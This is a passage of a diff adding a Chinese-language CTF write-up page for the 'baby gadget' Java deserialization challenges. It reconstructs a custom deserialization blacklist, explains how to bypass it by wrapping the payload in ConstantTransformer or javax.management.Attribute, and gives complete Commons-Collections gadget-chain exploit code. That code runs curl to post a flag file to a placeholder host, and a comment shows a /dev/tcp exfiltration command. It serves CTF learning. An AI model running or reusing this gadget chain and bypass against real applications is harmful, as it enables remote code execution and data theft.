+    IFNE L4
+    ALOAD 1
+   L11
+    LINENUMBER 35 L11
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Collection&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFNE L4
+    ALOAD 1
+   L12
+    LINENUMBER 36 L12
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Impl&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFNE L4
+    ALOAD 1
+   L13
+    LINENUMBER 37 L13
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    LDC &#34;Bag&#34;
+    INVOKEVIRTUAL java/lang/String.contains (Ljava/lang/CharSequence;)Z
+    IFEQ L14
+   L4
+    LINENUMBER 39 L4
+   FRAME SAME
+    NEW java/lang/ClassNotFoundException
+    DUP
+    NEW java/lang/StringBuilder
+    DUP
+    INVOKESPECIAL java/lang/StringBuilder.&lt;init&gt; ()V
+    LDC &#34;Cannot deserialize &#34;
+    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
+    ALOAD 1
+    INVOKEVIRTUAL java/io/ObjectStreamClass.getName ()Ljava/lang/String;
+    INVOKEVIRTUAL java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;
+    INVOKEVIRTUAL java/lang/StringBuilder.toString ()Ljava/lang/String;
+    INVOKESPECIAL java/lang/ClassNotFoundException.&lt;init&gt; (Ljava/lang/String;)V
+    ATHROW
+   L14
+    LINENUMBER 41 L14
+   FRAME SAME
+    ALOAD 0
+    ALOAD 1
+    INVOKESPECIAL java/io/ObjectInputStream.resolveClass (Ljava/io/ObjectStreamClass;)Ljava/lang/Class;
+    ARETURN
+   L1
+    LINENUMBER 44 L1
+   FRAME SAME
+    ALOAD 0
+    ALOAD 1
+    INVOKESPECIAL java/io/ObjectInputStream.resolveClass (Ljava/io/ObjectStreamClass;)Ljava/lang/Class;
+    ARETURN
+   L15
+    LOCALVARIABLE this Lcom/tr1ple/sus/controller/SafeInputStream; L0 L15 0
+    LOCALVARIABLE des Ljava/io/ObjectStreamClass; L0 L15 1
+    MAXSTACK = 4
+    MAXLOCALS = 2
+
+  // access flags 0x8
+  static &lt;clinit&gt;()V
+   L0
+    LINENUMBER 12 L0
+    ICONST_5
+    ANEWARRAY java/lang/String
+    DUP
+    ICONST_0
+    LDC &#34;java.util.Hashtable&#34;
+    AASTORE
+    DUP
+    ICONST_1
+    LDC &#34;java.util.HashSet&#34;
+    AASTORE
+    DUP
+    ICONST_2
+    LDC &#34;java.util.HashMap&#34;
+    AASTORE
+    DUP
+    ICONST_3
+    LDC &#34;javax.management.BadAttributeValueExpException&#34;
+    AASTORE
+    DUP
+    ICONST_4
+    LDC &#34;java.util.PriorityQueue&#34;
+    AASTORE
+    PUTSTATIC com/tr1ple/sus/controller/SafeInputStream.blacklist : [Ljava/lang/String;
+    RETURN
+    MAXSTACK = 4
+    MAXLOCALS = 0
+}
+</code></pre><p>如果对JVM指令有所了解，这个汇编本身并不难读，有两点：</p>
+<ul>
+<li>一个springboot的路由 <code>/bf2dcf6664b16e0efe471b2eac2b54b2</code> ，这个接口会获取body的数据，先URL解码，再base64解码，最后直接反序列化，但是这里用到了自定义的ObjectInputStream <code>SafeInputStream</code></li>
+<li><code>SafeInputStream</code> 继承了 <code>ObjectInputStream</code> ，内置了反序列化黑名单，并在 <code>resolveClass</code> 中检测</li>
+</ul>
+<p>和队友@Longlone根据虚拟机指令手动还原出了本身的java文件：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">SafeInputStream</span> <span style="color:#6ab825;font-weight:bold">extends</span> ObjectInputStream {
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">boolean</span> entry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">private</span> <span style="color:#6ab825;font-weight:bold">final</span> <span style="color:#6ab825;font-weight:bold">static</span> String[] blackList = <span style="color:#6ab825;font-weight:bold">new</span> String[]{
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.Hashtable&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.HashSet&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.HashMap&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;javax.management.BadAttributeValueExpException&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.PriorityQueue&#34;</span>
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#447fcf">SafeInputStream</span>(InputStream in) <span style="color:#6ab825;font-weight:bold">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">super</span>(in);
+</span></span><span style="display:flex;"><span>        entry = <span style="color:#6ab825;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ffa500">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span style="color:#6ab825;font-weight:bold">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (entry) {
+</span></span><span style="display:flex;"><span>            entry = <span style="color:#6ab825;font-weight:bold">false</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">if</span> (Arrays.<span style="color:#bbb">asList</span>(blackList).<span style="color:#bbb">contains</span>(desc.<span style="color:#bbb">getName</span>()) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Set&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;List&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Map&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Tree&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Font&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Support&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Collection&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Impl&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Bag&#34;</span>)
+</span></span><span style="display:flex;"><span>            ) {
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">throw</span> <span style="color:#6ab825;font-weight:bold">new</span> ClassNotFoundException(<span style="color:#ed9d13">&#34;Cannot deserializ &#34;</span> + desc.<span style="color:#bbb">getName</span>());
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#6ab825;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">super</span>.<span style="color:#bbb">resolveClass</span>(desc);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">super</span>.<span style="color:#bbb">resolveClass</span>(desc);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这里绕过resolve，只需要把实际的反序列化对象套在一个不在黑名单且可以反序列化的类中，第一轮扫描之后entry就为false，绕过黑名单检测，之后就会正常递归反序列化其属性。比较合适是 <code>ConstantTransformer</code> ，因为它有一个属性是 <code>Object</code> 类型的，可以设置为任何值。</p>
+<p>依赖是CC3.1，JDK版本是8u191，选择一条合适的Gadget构造序列化数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">Main</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>(String[] args) <span style="color:#6ab825;font-weight:bold">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Transformer[] transformers = <span style="color:#6ab825;font-weight:bold">new</span> Transformer[]{
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> ConstantTransformer(Runtime.<span style="color:#bbb">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;getMethod&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[]{String.<span style="color:#bbb">class</span>, Class[].<span style="color:#bbb">class</span>}, <span style="color:#6ab825;font-weight:bold">new</span> Object[]{<span style="color:#ed9d13">&#34;getRuntime&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[0]}),
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;invoke&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[]{Object.<span style="color:#bbb">class</span>, Object[].<span style="color:#bbb">class</span>}, <span style="color:#6ab825;font-weight:bold">new</span> Object[]{<span style="color:#6ab825;font-weight:bold">null</span>, <span style="color:#6ab825;font-weight:bold">new</span> Object[0]}),
+</span></span><span style="display:flex;"><span>                <span style="color:#999;font-style:italic">// 先命令外带列目录 ls / | base64 &gt; /dev/tcp/127.0.0.1/23333
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>                <span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;exec&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[]{String[].<span style="color:#bbb">class</span>}, <span style="color:#6ab825;font-weight:bold">new</span> Object[]{<span style="color:#6ab825;font-weight:bold">new</span> String[]{<span style="color:#ed9d13">&#34;curl&#34;</span>, <span style="color:#ed9d13">&#34;-d&#34;</span>, <span style="color:#ed9d13">&#34;@/th1s_is_f1ag.txt&#34;</span>,<span style="color:#ed9d13">&#34;http://IP:PORT/Foo/&#34;</span>}}),
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> ConstantTransformer(1)
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        Transformer chainedTransformer = <span style="color:#6ab825;font-weight:bold">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>        Map innerMap = <span style="color:#6ab825;font-weight:bold">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        Map outerMap = LazyMap.<span style="color:#bbb">decorate</span>(innerMap, chainedTransformer);
+</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry = <span style="color:#6ab825;font-weight:bold">new</span> TiedMapEntry(outerMap, <span style="color:#ed9d13">&#34;111&#34;</span>);
+</span></span><span style="display:flex;"><span>        Map&lt;String, Object&gt; expMap = <span style="color:#6ab825;font-weight:bold">new</span> HashMap&lt;String, Object&gt;();
+</span></span><span style="display:flex;"><span>        expMap.<span style="color:#bbb">put</span>(<span style="color:#ed9d13">&#34;222&#34;</span>, tiedMapEntry);
+</span></span><span style="display:flex;"><span>        Class clazz = Class.<span style="color:#bbb">forName</span>(<span style="color:#ed9d13">&#34;org.apache.commons.collections.bidimap.DualHashBidiMap&#34;</span>);
+</span></span><span style="display:flex;"><span>        Constructor constructor = clazz.<span style="color:#bbb">getDeclaredConstructor</span>(Map.<span style="color:#bbb">class</span>, Map.<span style="color:#bbb">class</span>, BidiMap.<span style="color:#bbb">class</span>);
+</span></span><span style="display:flex;"><span>        constructor.<span style="color:#bbb">setAccessible</span>(<span style="color:#6ab825;font-weight:bold">true</span>);
+</span></span><span style="display:flex;"><span>        Object dualHashBidiMap = constructor.<span style="color:#bbb">newInstance</span>(expMap, <span style="color:#6ab825;font-weight:bold">null</span>, <span style="color:#6ab825;font-weight:bold">null</span>);
+</span></span><span style="display:flex;"><span>		
+</span></span><span style="display:flex;"><span>        <span style="color:#999;font-style:italic">// 套一层ConstantTransformer用于bypass resolveClass()
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>        ConstantTransformer f = <span style="color:#6ab825;font-weight:bold">new</span> ConstantTransformer(dualHashBidiMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream baos = <span style="color:#6ab825;font-weight:bold">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos = <span style="color:#6ab825;font-weight:bold">new</span> ObjectOutputStream(baos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#bbb">writeObject</span>(f);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String encode = <span style="color:#6ab825;font-weight:bold">new</span> BASE64Encoder().<span style="color:#bbb">encode</span>(baos.<span style="color:#bbb">toByteArray</span>()).<span style="color:#bbb">replace</span>(<span style="color:#ed9d13">&#34;\n&#34;</span>, <span style="color:#ed9d13">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(encode);
+</span></span><span style="display:flex;"><span>        String s = URLEncoder.<span style="color:#bbb">encode</span>(encode);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        StringSelection selection = <span style="color:#6ab825;font-weight:bold">new</span> StringSelection(s);
+</span></span><span style="display:flex;"><span>        Clipboard clipboard = Toolkit.<span style="color:#bbb">getDefaultToolkit</span>().<span style="color:#bbb">getSystemClipboard</span>();
+</span></span><span style="display:flex;"><span>        clipboard.<span style="color:#bbb">setContents</span>(selection, <span style="color:#6ab825;font-weight:bold">null</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>不能直接弹shell，采用命令外带+文件读取的方式拿flag。</p>
+<h2 id="baby-gadget-v20-revenge">baby gadget v2.0 revenge</h2>
+<p>XXE的方式同上，拿到源码的ASM汇编之后和上一题的进行diff：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227213311806.png" alt="image-20220227213311806"></p>
+<p>同样不难写出其java源代码的形式：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">SafeInputStream</span> <span style="color:#6ab825;font-weight:bold">extends</span> ObjectInputStream {
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">boolean</span> entry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">private</span> <span style="color:#6ab825;font-weight:bold">final</span> <span style="color:#6ab825;font-weight:bold">static</span> String[] blackList = <span style="color:#6ab825;font-weight:bold">new</span> String[]{
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.Hashtable&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.HashSet&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.HashMap&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;javax.management.BadAttributeValueExpException&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ed9d13">&#34;java.util.PriorityQueue&#34;</span>
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#447fcf">SafeInputStream</span>(InputStream in) <span style="color:#6ab825;font-weight:bold">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">super</span>(in);
+</span></span><span style="display:flex;"><span>        entry = <span style="color:#6ab825;font-weight:bold">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ffa500">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span style="color:#6ab825;font-weight:bold">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (entry) {
+</span></span><span style="display:flex;"><span>            entry = <span style="color:#6ab825;font-weight:bold">false</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">if</span> (Arrays.<span style="color:#bbb">asList</span>(blackList).<span style="color:#bbb">contains</span>(desc.<span style="color:#bbb">getName</span>()) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Set&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;List&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Map&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Tree&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Font&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Support&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Collection&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Impl&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;Bag&#34;</span>) ||
+</span></span><span style="display:flex;"><span>                    !desc.<span style="color:#bbb">getName</span>().<span style="color:#bbb">contains</span>(<span style="color:#ed9d13">&#34;javax&#34;</span>)
+</span></span><span style="display:flex;"><span>            ) {
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">throw</span> <span style="color:#6ab825;font-weight:bold">new</span> ClassNotFoundException(<span style="color:#ed9d13">&#34;Cannot deserializ &#34;</span> + desc.<span style="color:#bbb">getName</span>());
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } <span style="color:#6ab825;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">super</span>.<span style="color:#bbb">resolveClass</span>(desc);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">super</span>.<span style="color:#bbb">resolveClass</span>(desc);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>相比于上一题，就是限制了第一轮的 <code>resolveClass()</code> 的类必须在 <code>javax</code> 包下，第一时间想到了 <code>BadAttributeValueExpException</code>  ,但是这个类已经在黑名单中了，之后在 <code>javax.management</code> 包下面找到了 <code>Attribute</code> 类：</p>
+<p><img src="https://image-1302577725.cos.ap-beijing.myqcloud.com/uPic/image-20220227213448256.png" alt="image-20220227213448256"></p>
+<p>同样可以携带Object类型的属性，且可以被序列化，所以直接构造序列化数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">class</span> <span style="color:#447fcf;text-decoration:underline">Main</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">static</span> <span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">main</span>(String[] args) <span style="color:#6ab825;font-weight:bold">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        Transformer[] transformers = <span style="color:#6ab825;font-weight:bold">new</span> Transformer[]{
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> ConstantTransformer(Runtime.<span style="color:#bbb">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;getMethod&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[]{String.<span style="color:#bbb">class</span>, Class[].<span style="color:#bbb">class</span>}, <span style="color:#6ab825;font-weight:bold">new</span> Object[]{<span style="color:#ed9d13">&#34;getRuntime&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[0]}),
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;invoke&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[]{Object.<span style="color:#bbb">class</span>, Object[].<span style="color:#bbb">class</span>}, <span style="color:#6ab825;font-weight:bold">new</span> Object[]{<span style="color:#6ab825;font-weight:bold">null</span>, <span style="color:#6ab825;font-weight:bold">new</span> Object[0]}),
+</span></span><span style="display:flex;"><span>                <span style="color:#999;font-style:italic">// 先命令外带列目录 ls / | base64 &gt; /dev/tcp/127.0.0.1/23333
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>                <span style="color:#6ab825;font-weight:bold">new</span> InvokerTransformer(<span style="color:#ed9d13">&#34;exec&#34;</span>, <span style="color:#6ab825;font-weight:bold">new</span> Class[]{String[].<span style="color:#bbb">class</span>}, <span style="color:#6ab825;font-weight:bold">new</span> Object[]{<span style="color:#6ab825;font-weight:bold">new</span> String[]{<span style="color:#ed9d13">&#34;curl&#34;</span>, <span style="color:#ed9d13">&#34;-d&#34;</span>, <span style="color:#ed9d13">&#34;@/this_1s_f1ag.txt&#34;</span>,<span style="color:#ed9d13">&#34;http://IP:PORT/Foo/&#34;</span>}}),
+</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">new</span> ConstantTransformer(1)
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        Transformer chainedTransformer = <span style="color:#6ab825;font-weight:bold">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span>        Map innerMap = <span style="color:#6ab825;font-weight:bold">new</span> HashMap();
+</span></span><span style="display:flex;"><span>        Map outerMap = LazyMap.<span style="color:#bbb">decorate</span>(innerMap, chainedTransformer);
+</span></span><span style="display:flex;"><span>        TiedMapEntry tiedMapEntry = <span style="color:#6ab825;font-weight:bold">new</span> TiedMapEntry(outerMap, <span style="color:#ed9d13">&#34;111&#34;</span>);
+</span></span><span style="display:flex;"><span>        Map&lt;String, Object&gt; expMap = <span style="color:#6ab825;font-weight:bold">new</span> HashMap&lt;String, Object&gt;();
+</span></span><span style="display:flex;"><span>        expMap.<span style="color:#bbb">put</span>(<span style="color:#ed9d13">&#34;222&#34;</span>, tiedMapEntry);
+</span></span><span style="display:flex;"><span>        Class clazz = Class.<span style="color:#bbb">forName</span>(<span style="color:#ed9d13">&#34;org.apache.commons.collections.bidimap.DualHashBidiMap&#34;</span>);
+</span></span><span style="display:flex;"><span>        Constructor constructor = clazz.<span style="color:#bbb">getDeclaredConstructor</span>(Map.<span style="color:#bbb">class</span>, Map.<span style="color:#bbb">class</span>, BidiMap.<span style="color:#bbb">class</span>);
+</span></span><span style="display:flex;"><span>        constructor.<span style="color:#bbb">setAccessible</span>(<span style="color:#6ab825;font-weight:bold">true</span>);
+</span></span><span style="display:flex;"><span>        Object dualHashBidiMap = constructor.<span style="color:#bbb">newInstance</span>(expMap, <span style="color:#6ab825;font-weight:bold">null</span>, <span style="color:#6ab825;font-weight:bold">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Attribute attribute = <span style="color:#6ab825;font-weight:bold">new</span> Attribute(<span style="color:#ed9d13">&#34;foo&#34;</span>, dualHashBidiMap);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream baos = <span style="color:#6ab825;font-weight:bold">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos = <span style="color:#6ab825;font-weight:bold">new</span> ObjectOutputStream(baos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#bbb">writeObject</span>(attribute);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        String encode = <span style="color:#6ab825;font-weight:bold">new</span> BASE64Encoder().<span style="color:#bbb">encode</span>(baos.<span style="color:#bbb">toByteArray</span>()).<span style="color:#bbb">replace</span>(<span style="color:#ed9d13">&#34;\n&#34;</span>, <span style="color:#ed9d13">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>        System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(encode);
+</span></span><span style="display:flex;"><span>        String s = URLEncoder.<span style="color:#bbb">encode</span>(encode);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        StringSelection selection = <span style="color:#6ab825;font-weight:bold">new</span> StringSelection(s);
+</span></span><span style="display:flex;"><span>        Clipboard clipboard = Toolkit.<span style="color:#bbb">getDefaultToolkit</span>().<span style="color:#bbb">getSystemClipboard</span>();
+</span></span><span style="display:flex;"><span>        clipboard.<span style="color:#bbb">setContents</span>(selection, <span style="color:#6ab825;font-weight:bold">null</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">//        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">//        ObjectInputStream objectInputStream = new SafeInputStream(bais);
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic">//        objectInputStream.readObject();
+</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>利用方式同上一题。</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/posts">All posts</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/about">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#baby-gadget-v10">baby gadget v1.0</a></li>
+    <li><a href="#baby-gadget-v10s-rrrevenge">baby gadget v1.0&rsquo;s rrrevenge</a></li>
+    <li><a href="#baby-gadget-v20">baby gadget v2.0</a></li>
+    <li><a href="#baby-gadget-v20-revenge">baby gadget v2.0 revenge</a></li>
+  </ul>
+</nav>
+    </div>
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
